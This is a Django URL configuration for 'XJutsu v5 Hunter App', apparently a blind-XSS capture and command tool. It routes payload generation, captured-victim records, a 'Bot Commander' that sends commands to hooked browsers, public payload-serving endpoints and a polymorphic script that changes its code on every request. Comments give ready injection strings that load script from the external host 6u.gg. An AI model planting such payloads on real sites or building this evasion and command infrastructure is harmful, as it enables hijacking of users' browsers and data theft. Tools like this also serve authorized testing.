"""
XJutsu v5 - URL Configuration for Hunter App
by Dave Lester B. Mondina / ANBU Black Ops Security
"""

from django.urls import path
from . import views

urlpatterns = [
    # Smart root - serves JS when loaded as script, otherwise redirects to dashboard
    # Enables shortest payload: <script src=//6u.gg></script>
    path('', views.smart_root, name='root'),

    # Dashboard (explicit path)
    path('dashboard/', views.dashboard, name='dashboard'),

    # Captures
    path('captures/', views.captures_list, name='captures_list'),
    path('captures/<uuid:capture_id>/', views.capture_detail, name='capture_detail'),
    path('captures/<uuid:capture_id>/status/', views.capture_update_status, name='capture_update_status'),
    path('captures/<uuid:capture_id>/delete/', views.capture_delete, name='capture_delete'),

    # Payloads
    path('payloads/', views.payloads_list, name='payloads_list'),
    path('payloads/create/', views.payload_create, name='payload_create'),
    path('payloads/<uuid:payload_id>/', views.payload_detail, name='payload_detail'),
    path('payloads/<uuid:payload_id>/delete/', views.payload_delete, name='payload_delete'),

    # Payload Library (framework-specific XSS patterns)
    path('library/', views.payload_library, name='payload_library'),

    # Payload Generator (Advanced)
    path('generator/', views.payload_generator, name='payload_generator'),
    path('generator/custom/', views.generate_custom_payload, name='generate_custom_payload'),
    path('generator/token/', views.generate_token, name='generate_token'),

    # Bot Commander
    path('commander/', views.bot_commander, name='bot_commander'),
    path('commander/send/', views.send_bot_command, name='send_bot_command'),

    # Settings
    path('settings/', views.settings_view, name='settings'),
    path('settings/webhook/create/', views.webhook_create, name='webhook_create'),
    path('settings/apikey/create/', views.api_key_create, name='api_key_create'),

    # Payload serving (public endpoints - CSRF exempt, CORS enabled)
    path('x.js', views.serve_payload_js, name='serve_payload'),
    path('p/<uuid:payload_id>.js', views.serve_payload_js, name='serve_payload_with_id'),

    # ES Module endpoint for import() calls
    path('m.js', views.serve_module_js, name='serve_module'),
    path('m/<str:module_name>.js', views.serve_module_js, name='serve_module_named'),

    # Advanced Polymorphic payload - unique code every request
    # Usage: <script src=//6u.gg/poly.js></script>
    path('poly.js', views.poly_js, name='poly_js'),

    # API callback (fallback for non-WebSocket)
    path('api/callback/', views.api_callback, name='api_callback'),
]
